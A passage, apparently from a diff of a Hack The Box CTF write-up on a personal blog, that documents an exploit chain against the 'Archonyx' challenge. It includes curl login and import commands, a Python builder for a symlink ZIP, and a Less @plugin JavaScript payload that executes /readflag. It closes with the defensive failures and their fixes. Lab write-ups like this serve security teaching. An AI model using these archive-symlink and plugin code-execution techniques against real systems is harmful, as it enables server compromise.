+  'username=[REDACTED]' \
+  --data-urlencode \
+  'password=[REDACTED]'
+
+grep -Ei \
+  'HTTP/|location:|set-cookie:' \
+  /tmp/ledgermaster_login.headers
+
+curl -sS \
+  -b /tmp/ledgermaster.cookies \
+  -D /tmp/ledgermaster.headers \
+  "$TARGET/ledgermaster/" \
+  -o /tmp/ledgermaster.html
+
+grep -Ei \
+  'HTTP/' \
+  /tmp/ledgermaster.headers</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 11.40.49 AM.png" alt="Ledgermaster login and 200 OK on restricted page" style="max-width:100%;margin:2rem 0;">
+
+<p>The login response issued a JWT cookie and redirected to <code>/ledger</code>. <code>/ledgermaster/</code> returned <code>200 OK</code>.</p>
+
+<p>Privilege escalation complete.</p>
+
+<p>The reusable database builder is available from the site's <a href="/scripts/">Scripts page</a> as <a href="/scripts/ledger_coup.py"><code>ledger_coup.py</code></a>.</p>
+
+<hr>
+
+<h2>Turning the seal renderer into code execution</h2>
+
+<p>The last surface was Less 4.2.0. The application blocked remote resources, but the renderer still accepted local <code>@plugin</code> directives.</p>
+
+<p>A Less plugin is JavaScript. Loading it executes the module's <code>install()</code> function inside the server-side renderer.</p>
+
+<p>I wrote <code>seal_sorcery.py</code> to place a plugin at <code>/tmp/seal_plugin.js</code>:</p>
+
+<pre><code class="language-python">import stat
+import zipfile
+
+plugin = r'''
+const fs = require('fs');
+const cp = require('child_process');
+
+module.exports = {
+  install() {
+    const flag = cp.execFileSync(
+      '/readflag',
+      { encoding: 'utf8' }
+    );
+    fs.writeFileSync(
+      '/app/public/clearance-proof.txt',
+      flag
+    );
+  }
+};
+'''.lstrip()
+
+with zipfile.ZipFile("seal_sorcery.zip", "w") as archive:
+    link = zipfile.ZipInfo("seal_plugin.js")
+    link.create_system = 3
+    link.external_attr = (stat.S_IFLNK | 0o777) &lt;&lt; 16
+    link.compress_type = zipfile.ZIP_STORED
+    archive.writestr(link, "/tmp/seal_plugin.js")
+
+    replacement = zipfile.ZipInfo("seal_plugin.js")
+    replacement.create_system = 3
+    replacement.external_attr = (stat.S_IFREG | 0o600) &lt;&lt; 16
+    replacement.compress_type = zipfile.ZIP_STORED
+    archive.writestr(replacement, plugin)</code></pre>
+
+<p>I built and inspected it:</p>
+
+<pre><code>python3 seal_sorcery.py
+zipinfo -l seal_sorcery.zip
+sha256sum seal_sorcery.zip</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 11.49.52 AM.png" alt="seal_sorcery.zip with duplicate seal_plugin.js entries" style="max-width:100%;margin:2rem 0;">
+
+<p>Plugin archive = correct.</p>
+
+<h3>The first import left useful state behind</h3>
+
+<p>The first fetch returned an <code>EEXIST</code> error while processing the duplicate <code>seal_plugin.js</code> entry. The later write through the same path supported that the symlink survived the failed request. I did not list the container filesystem to confirm its state between requests.</p>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 12.27.51 PM.png" alt="EEXIST error from first seal_sorcery import" style="max-width:100%;margin:2rem 0;">
+
+<p>I extracted the regular second entry and placed it in an ordinary one-file archive:</p>
+
+<pre><code>python3 - &lt;&lt;'PY'
+import zipfile
+
+with zipfile.ZipFile("seal_sorcery.zip") as source:
+    entries = [
+        item
+        for item in source.infolist()
+        if item.filename == "seal_plugin.js"
+    ]
+
+    with open("seal_plugin.js", "wb") as output:
+        output.write(source.read(entries[-1]))
+
+print("extracted=seal_plugin.js")
+PY
+
+rm -f seal_payload.zip
+zip -q seal_payload.zip seal_plugin.js
+zipinfo -l seal_payload.zip</code></pre>
+
+<p>After verifying the served hash, I imported the ordinary archive:</p>
+
+<pre><code>curl -fsS \
+  "$CONTROLLED_HOST/seal_payload.zip" \
+  -o /tmp/served_seal_payload.zip
+
+sha256sum \
+  seal_payload.zip \
+  /tmp/served_seal_payload.zip
+
+curl -sS -i -X POST \
+  "$TARGET/api/fetch" \
+  -H "X-API-Key: $RELAY_KEY" \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode \
+  "url=$CONTROLLED_HOST/seal_payload.zip"</code></pre>
+
+<p>The regular file followed the link left by the failed import and wrote the plugin to <code>/tmp/seal_plugin.js</code>.</p>
+
+<p>It described the partial filesystem state the next request could use.</p>
+
+<p>The reusable plugin builder is available from the site's <a href="/scripts/">Scripts page</a> as <a href="/scripts/seal_sorcery.py"><code>seal_sorcery.py</code></a>.</p>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 12.27.51 PM.png" alt="Import verification for seal payload" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Casting the seal</h2>
+
+<p>I asked the privileged renderer to load the local plugin:</p>
+
+<pre><code>curl -sS -i \
+  -b /tmp/ledgermaster.cookies \
+  -X POST \
+  "$TARGET/ledgermaster/render" \
+  -H 'Content-Type: application/json' \
+  --data-binary \
+  '{"css":"@plugin \"/tmp/seal_plugin.js\";\n#preview-badge { color: red; }"}'</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 12.18.47 PM.png" alt="Less renderer returning Seal cast confirmation" style="max-width:100%;margin:2rem 0;">
+
+<p>The renderer returned:</p>
+
+<pre><code class="language-json">{"data":"Seal cast"}</code></pre>
+
+<p>The plugin had invoked <code>/readflag</code> and written its output into the public directory. I retrieved the proof:</p>
+
+<pre><code>curl -sS \
+  "$TARGET/clearance-proof.txt"</code></pre>
+
+<p>And now the seal is cast. Flag time.</p>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 12.16.31 PM copy.png" alt="Redacted proof of completion" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>HTB{REDACTED}</code></pre>
+
+<hr>
+
+<h2>What the chain depended on</h2>
+
+<p>Every stage supplied something the next stage needed:</p>
+
+<table>
+<tr><td><strong>Stage</strong></td><td><strong>Result</strong></td></tr>
+<tr><td>Authenticated Warden visit</td><td>Ambient same-origin authority.</td></tr>
+<tr><td>Query-parser differential</td><td>Browser-controlled <code>innerHTML</code>.</td></tr>
+<tr><td>First archive overwrite</td><td>Same-origin <code>theme.js</code> execution.</td></tr>
+<tr><td>Relay-key request</td><td>Authorization for direct archive imports.</td></tr>
+<tr><td>Database overwrite</td><td>Verified Ledgermaster identity.</td></tr>
+<tr><td>Plugin write</td><td>Server-side JavaScript at an allowed local path.</td></tr>
+<tr><td>Less <code>@plugin</code></td><td>Execution of <code>/readflag</code>.</td></tr>
+</table>
+
+<p>The corresponding defensive failures were equally specific:</p>
+
+<ul>
+<li>The review bot accepted arbitrary destinations while carrying an authenticated cookie.</li>
+<li>The server validated one query representation while the browser consumed another.</li>
+<li>The archive importer accepted duplicate paths and symbolic links.</li>
+<li>Validation ran after filesystem writes.</li>
+<li>The bot's API key authorized a state-changing import endpoint.</li>
+<li>The authentication database sat within reach of the importer.</li>
+<li>The Less renderer could load local JavaScript plugins from attacker-controlled files.</li>
+</ul>
+
+<p>The fixes follow those boundaries: restrict bot destinations and authority, use one validated query representation, reject links and duplicate canonical archive paths before extraction, extract without following links, separate importer credentials from bot identity, protect authentication state from importer writes, and disable JavaScript plugins in user-controlled Less.</p>
+
+<hr>
+
+<h2>Attribution</h2>
+
+<p>I performed the source review, live route mapping, Warden reachability test, parser-differential test, payload construction, delivery troubleshooting, relay-key validation, database replacement, Ledgermaster login, Less plugin placement, and proof retrieval documented here. No teammate contribution is documented for Archonyx.</p>
+
+<p>HTB permitted AI as a supporting tool during the event. I used it to help reason through the trust boundaries, review payload construction, troubleshoot delivery behavior, and organize the evidence. I ran the commands, operated the challenge environment, interpreted the responses, revised failed assumptions, and verified every transition before submission.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<ol>
+<li>Reviewed the source and mapped the Warden, query, archive, identity, and Less boundaries.</li>
+<li>Proved that <code>/report</code> launched an authenticated headless browser.</li>
+<li>Placed <code>theme</code> after Express's 1,000-parameter limit.</li>
+<li>Reached the browser's <code>innerHTML</code> sink through parameter 1,001.</li>
+<li>Used the Warden to import a duplicate-entry ZIP through internal <code>/api/fetch</code>.</li>
+<li>Overwrote <code>/app/public/theme.js</code> and recovered the bot relay key.</li>
+<li>Reused the archive primitive to replace <code>/app/data/db.json</code>.</li>
+<li>Authenticated as a verified Ledgermaster.</li>
+<li>Planted <code>/tmp/seal_plugin.js</code> through the importer's partial-write behavior.</li>
+<li>Loaded the local Less plugin, invoked <code>/readflag</code>, and retrieved the redacted proof.</li>
+</ol>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+<script>
+    (() => {
+        const menuToggle = document.getElementById("menu-toggle");
+        const menu = document.getElementById("menu");
+
+        if (!menuToggle || !menu) {
+            return;
+        }
+
+        document.documentElement.classList.add("js-menu-ready");
+
+        const closeMenu = (restoreFocus = false) => {
+            menuToggle.setAttribute("aria-expanded", "false");
+            menu.classList.remove("menu-open");
+
+            if (restoreFocus) {
+                menuToggle.focus();
+            }
+        };
+
+        menuToggle.addEventListener("click", () => {
+            const isOpen =
+                menuToggle.getAttribute("aria-expanded") === "true";
+
+            menuToggle.setAttribute(
+                "aria-expanded",
+                String(!isOpen)
+            );
+            menu.classList.toggle("menu-open", !isOpen);
+        });
+
+        menu.addEventListener("click", (event) => {
+            if (event.target.closest("a")) {
+                closeMenu();
+            }
+        });
+
+        document.addEventListener("click", (event) => {
+            const isOpen =
+                menuToggle.getAttribute("aria-expanded") === "true";
+
+            if (
+                isOpen &&
+                !menu.contains(event.target) &&
+                !menuToggle.contains(event.target)
+            ) {
+                closeMenu();
+            }
+        });
+
+        document.addEventListener("keydown", (event) => {
+            const isOpen =
+                menuToggle.getAttribute("aria-expanded") === "true";
+
+            if (event.key === "Escape" && isOpen) {
+                closeMenu(true);
+            }
+        });
+
+        const desktopQuery =
+            window.matchMedia("(min-width: 769px)");
+
+        desktopQuery.addEventListener("change", (event) => {
+            if (event.matches) {
+                closeMenu();
+            }
+        });
+    })();
+</script>
+</body>
+</html>
